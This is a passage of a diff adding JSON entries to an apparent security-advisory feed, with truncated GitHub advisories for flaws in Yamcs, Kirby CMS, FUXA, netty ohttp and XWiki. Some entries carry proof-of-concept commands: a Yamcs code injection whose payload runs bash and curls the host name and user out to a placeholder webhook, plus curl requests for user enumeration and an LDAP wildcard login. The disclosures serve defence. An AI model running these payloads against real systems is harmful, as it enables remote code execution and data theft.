+      "summary": "### Summary\nA Server-Side Code Injection vulnerability exists in the Yamcs algorithm evaluation engine (`org.yamcs.algorithms.JavaExprAlgorithmExecutionFactory`). The application dynamically compiles and evaluates user-controlled algorithm text without enforcing a secure sandbox. An authenticated user with the `ChangeMissionDatabase` privilege can exploit this to achieve Remote Code Execution (RCE) on the underlying host operating system via the Janino compiler.\n\n### Proof of Concept (PoC)\nThe vulnerability can be exploited by overriding an existing algorithm's text via the REST API and injecting a malicious Java payload that executes OS commands.\n\n**Prerequisites:**\n1. A running Yamcs instance with an active processor (e.g., `instance=myproject`, `processor=realtime`).\n2. An active authentication token for a user with the `SystemPrivilege.ChangeMissionDatabase` privilege.\n\n**Steps to Reproduce:**\n\n1. Send an authenticated HTTP `PATCH` request to the MDB override endpoint to inject the malicious Java code into an existing algorithm (e.g., `copySunsensor`). The payload uses `java.lang.Runtime` to execute a reverse shell or ping an external webhook.\n\n```bash\ncurl -i -X PATCH \\\n  'http://<YAMCS-SERVER-IP>:8090/api/mdb/myproject/realtime/algorithms/myproject/copySunsensor' \\\n  -H 'Content-Type: application/json' \\\n  -H 'Authorization: Bearer <YOUR_AUTH_TOKEN>' \\\n  -d '{\n    \"action\": \"SET\",\n    \"algorithm\": {\n      \"text\": \"try { java.lang.Runtime.getRuntime().exec(new String[]{\\\"bash\\\", \\\"-c\\\", \\\"curl https://<YOUR-WEBHOOK-URL>/$(hostname)_$(whoami)\\\"}); } catch (Exception e) {} out0.setFloatValue(1.0f);\"\n    }\n  }'\n```\n\n2. Trigger the algorithm evaluation by sending telemetry data that the algorithm depends on (e.g., running the `simulator.py` script to generate sun sensor data).\n3. The Yamcs server uses the Janino `SimpleCompiler` to compile the injected text into a Java class on the fly. Since no restrictive `ClassLoader` is applied, the payload is successfully comp",
+      "link": "https://github.com/advisories/GHSA-524g-x36v-9wm6",
+      "published": "2026-05-27T00:05:45Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-44632"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-44595",
+      "title": "Yamcs vulnerable to unauthorized user enumeration via IAM API endpoints",
+      "summary": "### Summary\n\nThe IAM API endpoints (`listUsers`, `getUser`, `listGroups`, and `getGroup`) in `yamcs-core` do not enforce the required `SystemPrivilege.ControlAccess` check. As a result, **any authenticated user** (even those with low or no privileges) can enumerate all user accounts in the system, including their usernames, superuser status, and group memberships.\n\nThis constitutes a broken access control vulnerability (CWE-862) that leaks sensitive user information.\n\n### Root Cause\n\n**File:** `yamcs-core/src/main/java/org/yamcs/http/api/IamApi.java:125,180,357,372`\n\n`listUsers()`, `getUser()`, `listGroups()`, and `getGroup()` do not require `SystemPrivilege.ControlAccess`. Any authenticated user \u2014 regardless of privileges \u2014 can enumerate all users, their superuser status, and group memberships:\n\n```java\n// listUsers \u2014 NO checkSystemPrivilege\npublic void listUsers(Context ctx, Empty request, ...) {\n    var sensitiveDetails = ctx.user.hasSystemPrivilege(SystemPrivilege.ControlAccess);\n    // sensitiveDetails=false for low-priv users, but name/superuser/active still exposed\n    for (User user : users) {\n        UserInfo userb = toUserInfo(user, sensitiveDetails, directory);\n        responseb.addUsers(userb);\n    }\n}\n```\n\nCompare with properly protected endpoints:\n\n```java\n// createUser \u2014 correctly protected\npublic void createUser(Context ctx, ...) {\n    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess); // present\n```\n\n### Impact\n\nAny authenticated user can:\n\n1. List all user accounts in the system\n2. Identify which accounts have superuser privileges\n3. Use this information to target privileged accounts\n\n### Proof of Concept\n\n```bash\n# Authenticate as any low-privilege user GET access_token\ncurl -s -X POST \"http://localhost:8090/auth/token\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"grant_type=password&username=lowpriv&password=lowpriv123\"\n\n# Enumerate all users \u2014 no ControlAccess required\ncurl -s \"http://TARGET:8090/api/users\" \\\n  -H \"Auth",
+      "link": "https://github.com/advisories/GHSA-p2rj-mrmc-9w29",
+      "published": "2026-05-27T00:03:56Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-44595"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-44177",
+      "title": "Kirby CMS has pre-authentication path traversal and PHP file inclusion during user lookup",
+      "summary": "### TL;DR\n\nThis vulnerability affects all Kirby sites on Kirby 5.3.0-5.4.0 and is independent from setup conditions and authentication.\n\n**This vulnerability is of high severity for all Kirby sites**.\n\n----\n\n### Introduction\n\nPath traversal is a type of attack that allows to access arbitrary filesystem paths. By using special elements such as `..` and `/` separators, attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system. One of the most common special elements is the `../` sequence, which in most modern operating systems is interpreted as the parent directory of the current location. Path traversal can give attackers information about the filesystem and directory structure on the server and can lead to additional attacks depending on the nature of the accessible files and directories.\n\nPHP file inclusion is a type of attack that allows to load and execute PHP files on the server that are not intended for direct inclusion. Depending on the logic inside the PHP files, this can lead to disclosure of sensitive information or unintended, malicious actions.\n\n### Affected components\n\nKirby's `Users` collection received a performance improvement in Kirby 5.3.0. Starting in this release, Kirby loads user objects lazily when they are first needed. Users are queried by their user ID, which is then used to look up the user's account directory in the `site/accounts` directory.\n\nThis applies to the authentication API (accessible to unauthenticated requests), the users API (accessible to authenticated users only) as well as to other places that use `$users->find()` to look up an individual user with a request-provided email or user ID.\n\n### Impact\n\nIn affected releases, Kirby did not correctly validate the provided user ID, causing a path traversal vulnerability. This vulnerability results in the following impact:\n\n- Arbitrary PHP file inclusion of files with the filename `index.php` (e.g. the main PHP files of plug",
+      "link": "https://github.com/advisories/GHSA-9hx7-c53c-v6x8",
+      "published": "2026-05-26T23:56:40Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-44177"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-44175",
+      "title": "Kirby CMS vulnerable to cross-site scripting (XSS) from list field content in the site frontend",
+      "summary": "### TL;DR\n\nThis vulnerability affects all Kirby sites that use the list field or list block, when content is authored by users who may not be fully trusted. The attack requires an authenticated Panel user with update permission to any list field or list block.\n\n**This vulnerability is of high severity for affected sites.**\n\nKirby sites are *not* affected if they don't use the list field (or blocks field with the list block) in any of their blueprints, or if every user who can edit content is fully trusted. The attack only surfaces in the site frontend (i.e. in the consuming project's templates). The Panel itself is unaffected and will not execute JavaScript that was injected into list field content.\n\n----\n\n### Introduction\n\nCross-site scripting (XSS) is a type of vulnerability that allows to execute any kind of JavaScript code inside the site frontend or Panel session of the same or other users. In the Panel, a harmful script can for example trigger requests to Kirby's API with the permissions of the victim.\n\nIn a *stored* XSS attack, the malicious payload is saved into the content data and has the potential to affect other users or site visitors.\n\nSuch vulnerabilities are critical if applications might have potential attackers in their group of authenticated Panel users. They can escalate their privileges if they get access to the Panel session of an admin user. Depending on the site, other JavaScript-powered attacks are possible.\n\nA specific class of stored XSS is auto-firing, meaning the malicious injected JavaScript code is executed by the browser when the page loads without the victim having to perform a specific action.\n\n### Affected components\n\nKirby's [list field](https://getkirby.com/docs/reference/panel/fields/list) stores its formatted content as HTML code. Unlike with other field types, it is not possible to [escape HTML special characters](https://getkirby.com/docs/guide/templates/escaping) against cross-site scripting (XSS) attacks, otherwise the forma",
+      "link": "https://github.com/advisories/GHSA-5fhx-9q32-q257",
+      "published": "2026-05-26T23:49:56Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-44175"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-44174",
+      "title": "Kirby CMS has an Arbitrary Method Call via REST API Search and Collection Query Endpoints",
+      "summary": "### TL;DR\n\nThis vulnerability affects all Kirby sites that might have potential attackers in the group of authenticated Panel users.\n\n**This vulnerability is of high severity for affected sites and has a high real-world impact.**\n\n----\n\n### Introduction\n\nArbitrary method call is a type of arbitrary code execution. It is a vulnerability that allows attackers to run any commands or code of the attacker's choice on a target machine or in a target process.\n\nDepending on the set of accessible methods, this can lead to disclosure of sensitive information or to unintended and malicious write actions.\n\n### Affected components\n\nKirby's data model is made up of model objects that are contained in collection objects. These collections can be queried with methods such as `$collection->filter()`, `$collection->sort()`, `$collection->group()`, `$collection->pluck()` and `$collection->findBy()`. Each of these methods allows to query the models contained in the collection by any accessible model attribute (field or method).\n\nKirby also provides endpoints in its REST API that allow to search through users or through children and files of the site or of a particular page. These endpoints allow the `search`, `not`, `filter` and `sort` queries as well as options to paginate the result. The same kind of queries can also be provided to API collections such as `/<site|page|user>/blueprints`, `/<site|page>/children`, `/<model>/files`, `/languages`, `/roles`, `/translations`, `/users` and `/<user>/roles`.\n\n### Impact\n\nIn affected releases, Kirby did not validate the model attributes that were used in the collection queries. This allowed attackers to include arbitrary model methods in their queries. This includes methods with sensitive data such as `password()` (disclosing the password hash) or `root()` (disclosing the absolute filesystem path on the server) as well as methods that perform impactful actions such as `loginPasswordless()` (causing a privilege escalation to another user) or `de",
+      "link": "https://github.com/advisories/GHSA-86rh-h242-j8xp",
+      "published": "2026-05-26T23:47:17Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-44174"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-43947",
+      "title": "FUXA Vulnerable to Unauthenticated Remote Code Execution via Script Test Mode Authorization Bypass",
+      "summary": "### Summary\n\nAn unauthenticated Remote Code Execution vulnerability exists in FUXA when `secureEnabled` is set to `true`. The `POST /api/runscript` endpoint checks authorization against the stored script's permission by ID, but when `test: true` is set in the request, it compiles and executes attacker-supplied code instead of the stored script's code. An unauthenticated attacker who knows a valid script ID and name may execute arbitrary code via test mode if at least one server-side script exists and is accessible without restrictive permissions.\n\nScript IDs and names can be obtained through the unauthenticated information disclosure in `GET /api/project` (reported separately).\n\nThe only prerequisite is that at least one server-side script exists in the project.\n\n### Details\n\n**Authorization confused deputy in script execution**\n\nFile: `server/runtime/scripts/index.js`, lines 86-103\n\nThe authorization check looks up the stored script by ID and validates the stored script's `permission` field:\n\n```javascript\nthis.isAuthorised = function (_script, permission) {\n    const st = scriptModule.getScript(_script);  // finds stored script by _script.id\n    if (admin || (st && (!st.permission || st.permission & permission))) {\n        return true;\n    }\n    return false;\n}\n```\n\nWhen a script has no `permission` field set (or `permission: 0`), the expression `!st.permission` evaluates to `true`, and the check passes for any caller including guests.\n\n**Guest auto-authentication in the middleware**\n\nFile: `server/api/jwt-helper.js`, lines 46-72\n\nThe `verifyToken` middleware generates a valid guest JWT when no token is provided:\n\n```javascript\nif (!token) {\n    token = getGuestToken();\n}\n```\n\nThe guest token passes verification. The request proceeds to the handler with `userId: \"guest\"`. The `isAuthorised` check then finds the stored script and validates against its permission. Scripts without a `permission` field pass for any user including guests.\n\n**Test mode executes attacker",
+      "link": "https://github.com/advisories/GHSA-rg3m-cfq7-g6h6",
+      "published": "2026-05-26T23:44:52Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-43947"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-43945",
+      "title": "FUXA Vulnerable to Pre-auth RCE via Path Manipulation & Configuration Injection",
+      "summary": "**Pre-auth** RCE in FUXA via Logic Bypass\n\nSummary\n\nA Critical vulnerability chain exists in FUXA (v.1.3.0-2706) that allows an unauthenticated remote attacker to achieve Full Remote Code Execution (RCE) as root. The exploit succeeds even when the platform is configured in its most secure state (Secure Mode Enabled and Node-RED Secure Auth Enabled).\n\nDetails\nThe vulnerability is a Path Confusion flaw in the authentication middleware. The server uses a substring match on the full URL (including query parameters) to exclude certain paths from authentication.\n\nInvolved Logic:\n\nJavaScript:\n```\nconst url = req.originalUrl || req.url || req.path;\nif (url.includes('/socket.io')) return next();\nBy appending ?x=/socket.io to any administrative request, the middleware is \"tricked\" into treating the request as a public WebSocket handshake, bypassing the secureEnabled and nodeRedAuthMode checks entirely.\n```\n\nProof of Concept\n\nA specially crafted request containing manipulated query parameters could bypass authentication checks on protected /nodered/* endpoints.\n\nIn configurations where Node-RED exposed privileged or command-execution capable nodes, this could lead to remote code execution within the container context.\n\nImpact\nAccess Level: Unauthenticated / Remote.\n\nPrivilege Level: Access to Node-RED administrative endpoints. \nRemote code execution may be possible depending on the Node-RED configuration and installed nodes.\n\nCVSS 3.1 Score: High severity.\n\nDescription: An attacker can gain total control over the SCADA server, allowing them to intercept industrial data (MQTT/OPC-UA), manipulate PLC tags, or pivot into the internal OT network.\n\nRoot Cause & Remediation\nThe root cause is the reliance on req.originalUrl for security-critical routing decisions.\n\nThe Fix:\nThe developer must use req.path (which Express pre-parses to remove query strings) or a formal URL parser to ensure that the security check is performed only against the pathname.\n\n```\nJavaScript\n\n// Secure approa",
+      "link": "https://github.com/advisories/GHSA-p69w-mmfv-xrfj",
+      "published": "2026-05-26T23:40:42Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-43945"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-42568",
+      "title": "Yamcs Vulnerable to LDAP Injection in LdapAuthModule",
+      "summary": "### Summary\n\nAn LDAP injection vulnerability exists in `org.yamcs.security.LdapAuthModule` when constructing search filters. The username parameter is inserted directly into the LDAP filter without proper RFC 4515 escaping.\n\n### Root Cause\n\n**File:** `yamcs-core/src/main/java/org/yamcs/security/LdapAuthModule.java:233`\n\nThe `username` parameter is inserted directly into an LDAP search filter without RFC 4515 escaping:\n\n```java\n// VULNERABLE\nvar filter = userFilter.replace(\"{0}\", username);\nvar searchResult = getSingleResult(ctx, userBase, filter, controls);\n```\n\nLDAP wildcard characters (`*`, `(`, `)`) are accepted without sanitization.\n\n### Impact\n\nWith a known valid password, `username=*` authenticates as the first user returned by the LDAP search \u2014 enabling horizontal privilege escalation between accounts sharing similar passwords or when the attacker knows one valid password.\n\nThis affects deployments that use `org.yamcs.security.LdapAuthModule` in their `etc/security.yaml` configuration file.\n\n### Proof of Concept\n\n```bash\ncurl -X POST \"http://TARGET:8090/auth/token\" \\\n  -d \"grant_type=password&username=*&password=known_password\"\n# Returns token for first matching LDAP user\n```\n\n### Fix\n\nApply RFC 4515 escaping before filter construction:\n\n```java\nprivate static String escapeLdapFilter(String input) {\n    return input\n        .replace(\"\\\\\", \"\\\\5c\")\n        .replace(\"*\",  \"\\\\2a\")\n        .replace(\"(\",  \"\\\\28\")\n        .replace(\")\",  \"\\\\29\")\n        .replace(\"\\0\", \"\\\\00\");\n}\nvar filter = userFilter.replace(\"{0}\", escapeLdapFilter(username));\n```",
+      "link": "https://github.com/advisories/GHSA-cqh3-jg8p-336j",
+      "published": "2026-05-26T23:39:55Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-42568"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-41207",
+      "title": "netty-incubator-codec-ohttp's HPKEContext operations may produce empty byte[] on failures",
+      "summary": "HKDF_expand: returns non-NULL on failure. The byte[] is filled with zeros and has no way to distinguish success from failure. Since this output is used as HKDF key material for the response AEAD, a  failure silently produces an all-zero key.\n\nWhen EVP_HPKE_CTX_export fails it also returns an empty byte[] array filled with zeros. This byte[] feeds directly into OHttpCrypto.createResponseAEAD(...).  A silent all-zero export secret would produce a deterministic, attacker-predictable AEAD key.",
+      "link": "https://github.com/advisories/GHSA-f659-372h-6x3x",
+      "published": "2026-05-26T23:08:26Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-41207"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-48048",
+      "title": "XWiki Platform's Livetable results still allow reconstructing password hashes using 768 requests",
+      "summary": "### Impact\nXWiki discovered that the patch for GHSA-5cf8-vrr8-8hjm was insufficient and with slightly modified parameters to the `LiveTableResults`, it is still possible to discover password hashes one bit at a time, so with 768 requests, the full password salt and hash can be retrieved of a user.\n\n### Patches\nThe check for password (and email properties) has been adjusted in XWiki 18.0.0RC1, 17.10.13, 17.4.9 and 16.10.17.\n\n### Workarounds\nThe [patch](https://github.com/xwiki/xwiki-platform/commit/c4442716b02ffcdaa9d5e703b1db6203e36456fa#diff-5a739e5865b1f1ad9d79b724791be51b0095a0170cc078911c940478b13b949a) can be applied manually to the wiki page `XWiki.LiveTableResultsMacros`.\n\n### Resources\n* https://jira.xwiki.org/browse/XWIKI-23875\n* https://github.com/xwiki/xwiki-platform/commit/c4442716b02ffcdaa9d5e703b1db6203e36456fa",
+      "link": "https://github.com/advisories/GHSA-rh28-mqj4-8x59",
+      "published": "2026-05-26T20:16:59Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-48048"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
     },
     {
       "id": "CVE-2026-28445",
